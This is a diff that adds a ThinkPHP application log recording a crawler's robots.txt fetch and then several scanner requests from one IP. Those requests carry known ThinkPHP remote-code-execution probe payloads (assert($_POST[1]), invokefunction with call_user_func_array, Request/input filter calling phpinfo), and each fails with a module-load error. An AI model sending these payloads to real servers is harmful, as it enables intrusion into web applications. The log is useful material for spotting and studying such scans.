@@ -1,0 +1,30 @@
+[ 2019-04-27T11:57:40+08:00 ] 66.249.66.217 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-04-27T14:20:26+08:00 ] 34.92.140.20 /index.php?s=captcha&m=assert($_POST[1])
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-04-27T14:20:26+08:00 ] 34.92.140.20 /index.php?s=captcha&m=assert($_POST[1])index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000247s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-04-27T14:20:26+08:00 ] 34.92.140.20 /index.php?s=captcha&m=assert($_POST[1])index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-04-27T14:20:26+08:00 ] 34.92.140.20 /index.php?s=captcha&m=assert($_POST[1])index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000197s ]
+ERR: 无法加载模块:Captcha
+
